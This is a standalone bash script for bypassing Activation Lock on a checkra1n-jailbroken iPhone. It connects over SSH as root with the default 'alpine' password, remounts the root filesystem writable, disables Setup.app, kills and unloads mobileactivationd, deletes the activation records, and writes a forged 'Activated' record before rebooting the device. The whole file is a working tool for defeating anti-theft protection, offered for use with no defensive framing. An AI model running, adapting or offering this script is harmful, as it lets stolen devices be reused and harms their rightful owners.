#!/bin/bash
# ═══════════════════════════════════════════════════════
# Standalone Activation Lock Bypass via SSH
# Run AFTER checkra1n jailbreak succeeds and device boots
# ═══════════════════════════════════════════════════════
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export PATH="$SCRIPT_DIR/bin:$PATH"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
info()    { echo -e "${BOLD}[*]${NC} $1"; }
success() { echo -e "${GREEN}[✓]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
fail()    { echo -e "${RED}[✗]${NC} $1"; }

SSH_PORT=44
SSH_PASS="alpine"
SSH_CMD=""

echo ""
echo "  ╔═══════════════════════════════════════════╗"
echo "  ║  Activation Lock Bypass (standalone)       ║"
echo "  ╚═══════════════════════════════════════════╝"
echo ""

# ── Check device ──
info "Checking for connected device..."
if ! idevice_id -l 2>/dev/null | grep -q .; then
    fail "No device found. Is the phone booted and connected via USB?"
    exit 1
fi
UDID="$(idevice_id -l 2>/dev/null | head -n1)"
success "Device: $UDID"

# ── Start iproxy ──
info "Starting SSH tunnel..."
pkill -f "iproxy 2222" 2>/dev/null || true
sleep 1

try_ssh_port() {
    local port="$1"
    pkill -f "iproxy 2222" 2>/dev/null || true
    sleep 1
    iproxy 2222 "$port" &>/dev/null &
    local pid=$!
    sleep 3
    if sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p 2222 root@localhost "echo ok" &>/dev/null; then
        SSH_CMD="sshpass -p $SSH_PASS ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -p 2222 root@localhost"
        SSH_PORT="$port"
        return 0
    fi
    kill $pid 2>/dev/null || true
    return 1
}

# Try port 44 (checkra1n dropbear), then port 22 (OpenSSH)
if try_ssh_port 44; then
    success "SSH connected on port 44 (checkra1n)"
elif try_ssh_port 22; then
    success "SSH connected on port 22 (OpenSSH)"
else
    fail "Cannot connect via SSH on port 44 or 22."
    echo ""
    echo "  Possible fixes:"
    echo "  - Device may need re-jailbreak: enter DFU, run checkra1n again"
    echo "  - On device: open checkra1n app → install Cydia → install OpenSSH"
    echo "  - Try: iproxy 2222 44 & ssh -p 2222 root@localhost (password: alpine)"
    exit 1
fi

# ── Run bypass payload ──
info "Running bypass payload on device..."
echo ""

$SSH_CMD << 'PAYLOAD'
#!/bin/sh
echo "[device] === Activation Lock Bypass ==="
echo ""

# ── Step 1: Detect filesystem and remount read-write ──
echo "[device] Step 1: Remounting filesystem read-write..."

ROOTFS_WRITABLE=0

# Method 1: APFS-aware remount (iOS 12+)
if /sbin/mount -u / 2>/dev/null; then
    echo "[device]   tried: /sbin/mount -u /"
fi

# Method 2: mount with rw,update
mount -o rw,update / 2>/dev/null
echo "[device]   tried: mount -o rw,update /"

# Method 3: Classic HFS remount (iOS 10 and below)
/usr/bin/mount -uw / 2>/dev/null
echo "[device]   tried: mount -uw /"

# Method 4: Explicit APFS remount
mount_apfs -uw / 2>/dev/null
echo "[device]   tried: mount_apfs -uw /"

# Test if writable
if touch /var/.bypass_test 2>/dev/null; then
    rm -f /var/.bypass_test
    echo "[device]   /var is writable"
fi

if touch /.bypass_rootfs_test 2>/dev/null; then
    rm -f /.bypass_rootfs_test
    ROOTFS_WRITABLE=1
    echo "[device]   / (rootfs) is writable"
else
    echo "[device]   / (rootfs) is still READ-ONLY"
fi

# Method 5: If still read-only, try APFS snapshot rename
if [ "$ROOTFS_WRITABLE" -eq 0 ]; then
    echo "[device]   Trying APFS snapshot rename..."
    if command -v snappy >/dev/null 2>&1; then
        echo "[device]   Snapshots before:"
        snappy -f / -l 2>/dev/null || true
        snappy -f / -r orig-fs 2>/dev/null && echo "[device]   Snapshot renamed (need reboot+re-jailbreak)" || true
    fi

    # Also try fsctl
    if command -v fsctl >/dev/null 2>&1; then
        fsctl unprotect / 2>/dev/null || true
    fi

    # Try once more after snapshot ops
    /sbin/mount -u / 2>/dev/null
    mount -o rw,update / 2>/dev/null

    if touch /.bypass_rootfs_test2 2>/dev/null; then
        rm -f /.bypass_rootfs_test2
        ROOTFS_WRITABLE=1
        echo "[device]   / is now writable after snapshot rename"
    fi
fi

# ── Step 2: Remove Setup.app ──
echo ""
echo "[device] Step 2: Disabling Setup.app..."

if [ "$ROOTFS_WRITABLE" -eq 1 ]; then
    if [ -d "/Applications/Setup.app" ]; then
        mv "/Applications/Setup.app" "/Applications/Setup.app.disabled" && \
            echo "[device]   MOVED Setup.app -> Setup.app.disabled" || \
            echo "[device]   FAILED to move Setup.app"
    else
        echo "[device]   Setup.app already disabled or not found at /Applications/"
    fi
else
    echo "[device]   SKIPPED - rootfs is read-only (will need reboot+re-jailbreak)"
    echo "[device]   After reboot and re-jailbreak, run this bypass script again"
fi

# ── Step 3: Kill activation daemon ──
echo ""
echo "[device] Step 3: Killing mobileactivationd..."
killall -9 mobileactivationd 2>/dev/null && echo "[device]   Killed mobileactivationd" || echo "[device]   mobileactivationd not running"

# Disable the launch daemon if rootfs writable
if [ "$ROOTFS_WRITABLE" -eq 1 ]; then
    DP="/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
    if [ -f "$DP" ]; then
        mv "$DP" "${DP}.disabled" 2>/dev/null && echo "[device]   Disabled launch daemon" || true
    fi
fi
launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist 2>/dev/null || true

# ── Step 4: Clear activation records ──
echo ""
echo "[device] Step 4: Clearing activation records..."
for base in /var/root/Library/Lockdown /var/mobile/Library/mad \
            /var/containers/Data/System/*/Library/internal; do
    if [ -d "$base/activation_records" ] || [ -d "$base" ]; then
        rm -rf "$base/activation_records" 2>/dev/null
        rm -f "$base/data_ark.plist" 2>/dev/null
        echo "[device]   Cleared: $base"
    fi
done

# ── Step 5: Patch activation state ──
echo ""
echo "[device] Step 5: Patching activation state in data_ark.plist..."
DARK="/var/root/Library/Lockdown/data_ark.plist"
if [ -f "$DARK" ]; then
    /usr/libexec/PlistBuddy -c "Set :com.apple.mobile.ldwatch.diagnostics:ActivationState Activated" "$DARK" 2>/dev/null || \
    /usr/libexec/PlistBuddy -c "Add :com.apple.mobile.ldwatch.diagnostics:ActivationState string Activated" "$DARK" 2>/dev/null || true
    echo "[device]   Patched $DARK"
else
    echo "[device]   $DARK not found - creating stub"
    mkdir -p /var/root/Library/Lockdown
fi

# Write stub activation record
mkdir -p /var/root/Library/Lockdown/activation_records
cat > /var/root/Library/Lockdown/activation_records/activation_record.plist 2>/dev/null << 'ENDPLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ActivationState</key>
    <string>Activated</string>
</dict>
</plist>
ENDPLIST
echo "[device]   Wrote stub activation_record.plist"

# ── Step 6: Mark setup complete ──
echo ""
echo "[device] Step 6: Marking setup complete..."
for plist in /var/mobile/Library/Preferences/com.apple.purplebuddy.plist; do
    /usr/libexec/PlistBuddy -c "Set :SetupDone true" "$plist" 2>/dev/null || \
    /usr/libexec/PlistBuddy -c "Add :SetupDone bool true" "$plist" 2>/dev/null || true
    /usr/libexec/PlistBuddy -c "Set :SetupFinishedAllSteps true" "$plist" 2>/dev/null || \
    /usr/libexec/PlistBuddy -c "Add :SetupFinishedAllSteps bool true" "$plist" 2>/dev/null || true
    echo "[device]   Patched $plist"
done

# ── Step 7: Refresh UI ──
echo ""
echo "[device] Step 7: Refreshing UI cache..."
uicache --all 2>/dev/null || uicache 2>/dev/null || true

# ── Summary ──
echo ""
echo "[device] ════════════════════════════════════════"
if [ "$ROOTFS_WRITABLE" -eq 1 ]; then
    echo "[device] BYPASS COMPLETE"
    echo "[device] Setup.app disabled, activation patched."
    echo "[device] Device will reboot in 5 seconds..."
else
    echo "[device] PARTIAL BYPASS"
    echo "[device] Rootfs was READ-ONLY — Setup.app NOT moved."
    echo "[device] Activation records + state patched in /var (writable)."
    echo "[device] NEXT STEPS:"
    echo "[device]   1. Reboot device (will happen automatically)"
    echo "[device]   2. Re-enter DFU mode"
    echo "[device]   3. Re-run checkra1n"
    echo "[device]   4. Run: bash bypass.sh  (again)"
    echo "[device]   The snapshot rename should make rootfs writable on next boot."
fi
echo "[device] ════════════════════════════════════════"
PAYLOAD

echo ""

# ── Reboot ──
info "Rebooting device..."
$SSH_CMD "reboot" 2>/dev/null || true

pkill -f "iproxy 2222" 2>/dev/null || true

echo ""
success "Done. Watch the device — it should reboot now."
echo ""
echo "  If the device still shows Activation Lock after reboot:"
echo "    1. Re-enter DFU (Power+Home 8s, release Power, hold Home 8s)"
echo "    2. Re-run checkra1n:  checkra1n -c -v"
echo "    3. Wait for boot, then run:  bash bypass.sh"
echo ""
